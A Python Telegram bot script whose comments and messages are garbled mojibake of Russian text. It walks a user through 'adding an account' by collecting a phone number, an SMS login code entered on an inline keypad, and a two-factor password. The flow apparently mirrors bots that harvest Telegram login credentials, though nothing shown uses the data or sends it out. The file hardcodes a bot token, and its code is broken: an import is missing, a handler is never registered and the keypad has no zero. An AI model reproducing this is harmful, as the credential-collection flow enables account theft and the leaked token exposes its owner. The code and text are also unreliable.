import logging
from telegram import Update, ReplyKeyboardMarkup, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, CallbackContext

# –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# –°–ª–æ–≤–∞—Ä—å –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è —Å–æ—Å—Ç–æ—è–Ω–∏–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
user_states = {}

# –°—Ç–∞—Ä—Ç–æ–≤–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ
async def start(update: Update, context: CallbackContext):
    reply_keyboard = [['–î–æ–±–∞–≤–∏—Ç—å –∞–∫–∫–∞—É–Ω—Ç', 'üòä']]
    markup = ReplyKeyboardMarkup(reply_keyboard, one_time_keyboard=True, resize_keyboard=True)
    await update.message.reply_text(
        "–ü—Ä–∏–≤–µ—Ç! –í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:",
        reply_markup=markup
    )

# –§—É–Ω–∫—Ü–∏—è –¥–æ–±–∞–≤–ª–µ–Ω–∏—è –∞–∫–∫–∞—É–Ω—Ç–∞
async def add_account(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    user_states[user_id] = {'state': 'enter_phone'}  # –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
    await update.message.reply_text("–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞:")

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –¥–ª—è –≤–≤–æ–¥–∞ –Ω–æ–º–µ—Ä–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞
async def handle_message(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id in user_states and user_states[user_id]['state'] == 'enter_phone':
        # –°–æ—Ö—Ä–∞–Ω—è–µ–º –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞
        user_states[user_id]['phone'] = update.message.text
        user_states[user_id]['state'] = 'enter_code'  # –ü–µ—Ä–µ—Ö–æ–¥ –∫ —Å–ª–µ–¥—É—é—â–µ–º—É —à–∞–≥—É (–≤–≤–æ–¥ –∫–æ–¥–∞)

        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É 3x3 –¥–ª—è –≤–≤–æ–¥–∞ –∫–æ–¥–∞
        buttons = [
            [InlineKeyboardButton('1', callback_data='1'), InlineKeyboardButton('2', callback_data='2'), InlineKeyboardButton('3', callback_data='3')],
            [InlineKeyboardButton('4', callback_data='4'), InlineKeyboardButton('5', callback_data='5'), InlineKeyboardButton('6', callback_data='6')],
            [InlineKeyboardButton('7', callback_data='7'), InlineKeyboardButton('8', callback_data='8'), InlineKeyboardButton('9', callback_data='9')]
        ]
        reply_markup = InlineKeyboardMarkup(buttons)
        await update.message.reply_text('–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –∏–∑ SMS:', reply_markup=reply_markup)

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –Ω–∞–∂–∞—Ç–∏—è –Ω–∞ –∫–Ω–æ–ø–∫–∏ –∫–ª–∞–≤–∏–∞—Ç—É—Ä—ã –¥–ª—è –≤–≤–æ–¥–∞ –∫–æ–¥–∞
async def button_handler(update: Update, context: CallbackContext):
    query = update.callback_query
    user_id = query.from_user.id
    code = query.data  # –ü–æ–ª—É—á–∞–µ–º —Ü–∏—Ñ—Ä—É, –∫–æ—Ç–æ—Ä—É—é –≤–≤–µ–ª –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å

    # –ï—Å–ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤ —Å–æ—Å—Ç–æ—è–Ω–∏–∏ –≤–≤–æ–¥–∞ –∫–æ–¥–∞
    if user_id in user_states and user_states[user_id]['state'] == 'enter_code':
        if 'code' not in user_states[user_id]:
            user_states[user_id]['code'] = code
        else:
            user_states[user_id]['code'] += code

        # –ï—Å–ª–∏ –∫–æ–¥ –≤–≤–µ–¥–µ–Ω –ø–æ–ª–Ω–æ—Å—Ç—å—é (–ø—Ä–µ–¥–ø–æ–ª–æ–∂–∏–º, —á—Ç–æ –∫–æ–¥ —Å–æ—Å—Ç–æ–∏—Ç –∏–∑ 6 —Ü–∏—Ñ—Ä)
        if len(user_states[user_id]['code']) == 6:
            await query.edit_message_text(text=f"–ö–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –≤–≤–µ–¥–µ–Ω: {user_states[user_id]['code']}")
            user_states[user_id]['state'] = 'check_password'
            await context.bot.send_message(chat_id=user_id, text="–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å, –µ—Å–ª–∏ —Ç—Ä–µ–±—É–µ—Ç—Å—è (–µ—Å–ª–∏ –ø–∞—Ä–æ–ª—è –Ω–µ—Ç ‚Äî –ø—Ä–æ—Å—Ç–æ –ø—Ä–æ–ø—É—Å—Ç–∏—Ç–µ):")

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –¥–ª—è –ø–∞—Ä–æ–ª—è
async def handle_password(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id in user_states and user_states[user_id]['state'] == 'check_password':
        password = update.message.text
        if password:
            await update.message.reply_text(f"–ü–∞—Ä–æ–ª—å –ø—Ä–∏–Ω—è—Ç.")
        else:
            await update.message.reply_text("–ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è –∑–∞–≤–µ—Ä—à–µ–Ω–∞ –±–µ–∑ –ø–∞—Ä–æ–ª—è.")

        # –î–æ–±–∞–≤–ª—è–µ–º –∞–∫–∫–∞—É–Ω—Ç
        user_states[user_id]['state'] = 'account_added'
        await update.message.reply_text(f"–ê–∫–∫–∞—É–Ω—Ç —Å –Ω–æ–º–µ—Ä–æ–º {user_states[user_id]['phone']} –¥–æ–±–∞–≤–ª–µ–Ω.")

        # –ü–æ—è–≤–ª—è–µ—Ç—Å—è –∫–Ω–æ–ø–∫–∞ —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –∞–∫–∫–∞—É–Ω—Ç–∞–º–∏
        reply_keyboard = [['–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –∞–∫–∫–∞—É–Ω—Ç–∞–º–∏']]
        markup = ReplyKeyboardMarkup(reply_keyboard, resize_keyboard=True)
        await update.message.reply_text("–í—ã –º–æ–∂–µ—Ç–µ —É–ø—Ä–∞–≤–ª—è—Ç—å —Å–≤–æ–∏–º–∏ –∞–∫–∫–∞—É–Ω—Ç–∞–º–∏:", reply_markup=markup)

# –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –∑–∞–ø—É—Å–∫–∞ –±–æ—Ç–∞
def main():
    # –¢–æ–∫–µ–Ω –±–æ—Ç–∞
    TOKEN = "6760012279:AAGfY1w2LR7TuY1r_mbMXIyLlscrai2oT28"

    # –°–æ–∑–¥–∞–Ω–∏–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è
    application = ApplicationBuilder().token(TOKEN).build()

    # –î–æ–±–∞–≤–ª–µ–Ω–∏–µ –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–æ–≤ –∫–æ–º–∞–Ω–¥ –∏ —Å–æ–æ–±—â–µ–Ω–∏–π
    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.Text("–î–æ–±–∞–≤–∏—Ç—å –∞–∫–∫–∞—É–Ω—Ç"), add_account))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    application.add_handler(CallbackQueryHandler(button_handler))

    # –ó–∞–ø—É—Å–∫ –±–æ—Ç–∞
    application.run_polling()

if __name__ == '__main__':
    main()
